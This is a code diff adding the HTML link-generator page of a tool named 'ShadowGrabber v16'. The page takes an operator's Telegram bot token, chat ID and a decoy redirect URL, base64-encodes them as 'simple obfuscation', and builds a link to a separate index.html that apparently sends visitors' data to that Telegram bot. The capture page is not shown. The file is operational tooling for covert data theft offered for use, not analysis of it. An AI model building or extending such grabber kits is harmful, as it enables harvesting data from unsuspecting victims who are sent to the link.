@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShadowGrabber v16 | Link Generator</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --bg: #0a0a0a;
+            --surface: #1a1a1a;
+            --text: #e0e0e0;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', monospace;
+            background: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: var(--surface);
+            padding: 2rem;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            border: 1px solid #333;
+        }
+
+        h1 {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 2rem;
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+            color: #888;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            border-radius: 6px;
+            font-family: monospace;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: var(--primary);
+            color: #000;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+            margin-top: 1rem;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
+        }
+
+        #result {
+            margin-top: 2rem;
+            padding: 1rem;
+            background: #000;
+            border: 1px solid var(--primary);
+            border-radius: 6px;
+            word-break: break-all;
+            display: none;
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+
+        .note {
+            font-size: 0.8rem;
+            color: #666;
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: var(--primary);
+            height: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>💀 Link Generator</h1>
+
+        <div class="group">
+            <label>Telegram Bot Token</label>
+            <input type="text" id="token" placeholder="123456789:ABCdefGHIjklMNOpqrs...">
+        </div>
+
+        <div class="group">
+            <label>Chat ID</label>
+            <input type="text" id="chatid" placeholder="123456789">
+        </div>
+
+        <div class="group">
+            <label>Redirect URL (Optional)</label>
+            <input type="text" id="redirect" placeholder="https://youtube.com..."
+                value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+        </div>
+
+        <button onclick="generate()">Generate Link</button>
+        <div class="status" id="status"></div>
+
+        <div id="result">
+            <button class="copy-btn" onclick="copyLink()">COPY</button>
+            <div id="link-text" style="color: var(--primary); font-family: monospace;"></div>
+        </div>
+
+        <p class="note">This generates a secure #hash link. Data will be sent to your specific Telegram Bot.</p>
+    </div>
+
+    <script>
+        function generate() {
+            const token = document.getElementById('token').value.trim();
+            const chatid = document.getElementById('chatid').value.trim();
+            const redirect = document.getElementById('redirect').value.trim();
+            const status = document.getElementById('status');
+
+            if (!token || !chatid) {
+                status.style.color = '#ff4444';
+                status.textContent = '❌ Token and Chat ID are required';
+                return;
+            }
+
+            // Create payload object
+            const payload = {
+                t: token,
+                c: chatid,
+                r: redirect
+            };
+
+            // Encode to Base64 (simple obfuscation)
+            // JSON -> String -> Base64
+            const jsonStr = JSON.stringify(payload);
+            const base64 = btoa(jsonStr);
+
+            // Construct Link
+            const baseUrl = window.location.href.replace('generator.html', 'index.html');
+            const finalUrl = `${baseUrl}#tg=${base64}`;
+
+            // Show Result
+            document.getElementById('link-text').textContent = finalUrl;
+            document.getElementById('result').style.display = 'block';
+            status.style.color = '#00ff88';
+            status.textContent = '✅ Link Generated';
+        }
+
+        function copyLink() {
+            const text = document.getElementById('link-text').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                document.querySelector('.copy-btn').textContent = 'COPIED!';
+                setTimeout(() => document.querySelector('.copy-btn').textContent = 'COPY', 2000);
+            });
+        }
+    </script>
+</body>
+
+</html>
